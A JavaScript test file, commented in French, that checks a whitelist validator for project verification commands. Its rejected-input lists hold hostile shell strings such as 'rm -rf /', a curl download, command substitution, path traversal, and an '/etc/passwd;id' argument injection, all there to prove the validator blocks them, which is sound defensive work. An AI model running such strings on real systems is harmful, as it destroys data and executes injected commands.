import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { checkVerificationCommand } from "../src/verification-command.js";
import { projectDir, loadManifest, activeGraphs, readDatasets, datasetNodes } from "../src/graph-manifest.js";

const packageManifest = JSON.parse(await readFile(new URL("../package.json", import.meta.url), "utf8"));
const scripts = Object.keys(packageManifest.scripts || {});

const manifest = await loadManifest();
const corpusCommands = [];
for (const graphConfig of activeGraphs(manifest)) {
  for (const entry of await readDatasets(graphConfig)) {
    for (const node of datasetNodes(entry)) {
      if (node.verificationCommand !== undefined) corpusCommands.push([node.id, node.verificationCommand]);
    }
  }
}

test("le corpus entier passe la grammaire, sinon la contrainte serait décorative", () => {
  assert.ok(corpusCommands.length > 0, "aucun verificationCommand trouvé : le test ne prouverait rien");
  for (const [id, command] of corpusCommands) {
    assert.deepEqual(checkVerificationCommand(command, scripts), [], `${id} : ${command}`);
  }
});

// Le contrôle est une liste blanche. Ces cas ne sont pas une énumération des
// attaques possibles — une telle liste serait toujours incomplète — mais la
// démonstration que les formes hors grammaire n'ont aucun chemin d'admission.
test("aucune construction de shell n'est admise", () => {
  const rejected = [
    "npm run validate; rm -rf /",
    "npm run validate | tee out.txt",
    "npm run validate && curl https://exemple.test/x > /tmp/y",
    "npm run validate `whoami`",
    "npm run validate $(whoami)",
    "npm run validate & npm test",
    "npm run validate\nnpm test",
    "npm run validate && echo 'coucou'"
  ];
  for (const command of rejected) {
    assert.notDeepEqual(checkVerificationCommand(command, scripts), [], command);
  }
});

test("un script non déclaré dans package.json est refusé", () => {
  assert.deepEqual(checkVerificationCommand("npm run validate", scripts), []);
  const reasons = checkVerificationCommand("npm run exfiltrate", scripts);
  assert.equal(reasons.length, 1);
  assert.match(reasons[0], /undeclared script/);
});

test("aucun binaire hors des trois formes admises n'est lançable", () => {
  for (const command of ["bash -c ls", "node scripts/seed.js", "sh install.sh", "python -m http.server", "npx cowsay"]) {
    assert.notDeepEqual(checkVerificationCommand(command, scripts), [], command);
  }
});

test("node --test ne sort pas du répertoire test", () => {
  assert.deepEqual(checkVerificationCommand("node --test test/l4-projection.test.js", scripts), []);
  for (const command of ["node --test ../secrets.test.js", "node --test src/server.js", "node --test test/../../x.test.js"]) {
    assert.notDeepEqual(checkVerificationCommand(command, scripts), [], command);
  }
});

// npm interprète lui-même les drapeaux placés avant le séparateur. Exiger le --
// garantit que l'argument atteint le script visé plutôt que le gestionnaire.
test("les arguments passent par le séparateur -- et respectent une forme close", () => {
  assert.deepEqual(checkVerificationCommand("npm run seed -- --graph=design", scripts), []);
  assert.notDeepEqual(checkVerificationCommand("npm run seed --graph=design", scripts), []);
  assert.notDeepEqual(checkVerificationCommand("npm run seed -- --graph=/etc/passwd;id", scripts), []);
  assert.notDeepEqual(checkVerificationCommand("npm run seed --", scripts), []);
});

test("une commande vide est refusée plutôt que traitée comme sans effet", () => {
  for (const command of ["", "   ", undefined, null]) {
    assert.notDeepEqual(checkVerificationCommand(command, scripts), [], String(command));
  }
});

// La protection ne vaut que si elle nomme la raison qui la justifie : sans les
// nœuds de risque, la grammaire serait une restriction sans motif enregistré.
test("chaque protection déclarée dans le graphe répond à un risque nommé", async () => {
  const cluster = JSON.parse(await readFile(new URL("../data/l4-ontology-mapping.json", import.meta.url), "utf8"));
  const byId = new Map(cluster.nodes.map(node => [node.id, node]));
  const protections = cluster.nodes.filter(node => Array.isArray(node.answersRisks));
  assert.ok(protections.length >= 6, "le cluster doit porter les protections d'exécution");
  for (const protection of protections) {
    assert.ok(protection.protects?.trim(), `${protection.id} ne dit pas ce qu'il protège`);
    assert.ok(protection.residualRisk?.trim(), `${protection.id} ne déclare aucun risque résiduel`);
    for (const riskId of protection.answersRisks) {
      assert.ok(byId.has(riskId), `${protection.id} répond au risque inconnu ${riskId}`);
      const grounded = cluster.links.some(link =>
        link.type === "GROUNDS" && link.source === riskId && link.target === protection.id);
      assert.ok(grounded, `${riskId} ne fonde pas ${protection.id} par une arête`);
    }
  }
});

test("chaque risque nommé reçoit au moins une protection", async () => {
  const cluster = JSON.parse(await readFile(new URL("../data/l4-ontology-mapping.json", import.meta.url), "utf8"));
  const answered = new Set(cluster.nodes.flatMap(node => node.answersRisks || []));
  const risks = cluster.nodes.filter(node => node.id.startsWith("risk-"));
  assert.ok(risks.length >= 7, "les risques d'exécution doivent être consignés");
  for (const risk of risks) assert.ok(answered.has(risk.id), `${risk.id} reste sans protection`);
});

assert.ok(projectDir);
